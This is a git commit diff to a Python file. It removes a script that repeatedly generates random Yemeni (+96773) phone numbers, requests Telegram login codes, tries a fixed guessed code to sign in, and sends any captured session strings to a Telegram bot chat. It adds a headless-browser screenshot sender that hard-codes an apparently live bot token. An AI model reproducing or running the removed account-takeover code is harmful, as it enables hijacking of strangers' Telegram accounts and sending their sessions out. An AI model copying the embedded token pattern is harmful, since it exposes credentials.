6af33f3ffdb43f11fa9bc676a83f2eaa4982713c
abood77-sstak <omar7mw@gmail.com>
2024-11-08 10:56:49 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,68 +1,29 @@
+from selenium import webdriver
+import telebot
+from time import sleep
 
-import os
-from telethon import TelegramClient
-from telethon.sessions import StringSession
-from telethon.errors import FloodWaitError, PhoneMigrateError,PhoneNumberBannedError,PhoneCodeInvalidError, SendCodeUnavailableError, SessionPasswordNeededError
-import telebot, random, asyncio
+def web_driver():
+    options = webdriver.ChromeOptions()
+    options.add_argument("--verbose")
+    options.add_argument('--no-sandbox')
+    options.add_argument('--headless')
+    options.add_argument('--disable-gpu')
+    options.add_argument("--window-size=1920, 1200")
+    options.add_argument('--disable-dev-shm-usage')
+    driver = webdriver.Chrome(options=options)
+    return driver
 
-API_ID = os.environ["API_ID2"]
-API_HASH = os.environ["API_HASH2"]
-BOT_TOKEM = os.environ["BOT_TOKEN"]
+my_token = "6517080417:AAHQx2gxkQ5Sxs2GilTyCaOI4-jJZfIGaho"
+chat_id =7031532556
+bot = telebot.TeleBot(my_token)
 
+driver= web_driver()
+driver. maximize_window()
+url ="https://www.google.com/"
+driver.get(url)
+sleep(5)
+photo = driver.save_screenshot("screenshot.png")
+with open("screenshot.png", "rb") as photo:
+   bot.send_photo(chat_id, photo)
 
-
-#logging.basicConfig(level=logging.INFO)
-
-
-bot = telebot.TeleBot(BOT_TOKEM)
-chat_id = 1085837500
-
-bot.send_message(chat_id, "start")
-              
-async def send(phone:str):
-    
-    
-    for _ in range(5):
-        code = 27933
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        await client.connect()
-        if not await client.is_user_authorized():
-           try:
-              
-              #await asyncio.sleep(5)
-              await client.send_code_request(phone)
-              
-              await client.sign_in(phone, code)
-              string = client.session.save()
-              print(string)
-              bot.send_message(chat_id, f"{phone} ------\n{string}")
-              
-           except (PhoneCodeInvalidError, SessionPasswordNeededError):
-               pass
-           except (SendCodeUnavailableError,PhoneMigrateError):
-               print("cant send code")
-               break
-           except PhoneNumberBannedError:
-               print("banned number")
-               break
-           except FloodWaitError:
-               print("used")
-               break
-        else:
-            break
-    
-def randNum():
-    
-    return  f"+96773{random.randint(1000000,9999999)}"
- 
-async def main():
-    num = 5
-    while True:
-        allSend = [send(randNum()) for _ in range(num)]
-        await asyncio.gather(*allSend)
-
-if __name__ == "__main__":
-  
-    asyncio.run(main())
-
-      
+driver.quit()
